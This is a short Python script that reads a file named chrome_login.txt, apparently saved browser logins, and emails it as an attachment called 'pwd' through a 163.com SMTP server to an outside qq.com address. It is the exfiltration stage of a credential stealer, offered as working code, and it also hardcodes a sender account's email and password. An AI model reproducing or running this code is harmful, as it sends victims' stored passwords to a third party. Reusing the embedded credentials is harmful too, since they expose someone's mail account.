#coding:utf-8
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def email():
  msg = MIMEMultipart()
  _user = "13924089163@163.com"
  _pw = "huguohao123"
  _to = "168418909@qq.com"
  #构造附件
  att1 = MIMEText(open('D:\\chrome_login.txt','rb').read(),'base64','gb2312')
  att1["Content-Type"] = "application/octet-stream"
  att1["Content-Dispostion"] = 'attachment;filename="pwd"'

  msg.attach(att1)

  msg['TO'] = _to
  msg['FROM'] = _user
  msg['subject'] = 'pwd'

  try:
  	server = smtplib.SMTP('smtp.163.com',25)
  	server.connect('smtp.163.com',25)
  	server.login(_user,_pw)
  	server.sendmail(_user,_to,msg.as_string())
  	server.quit()
  	print(" get")
  except:
  	print("default")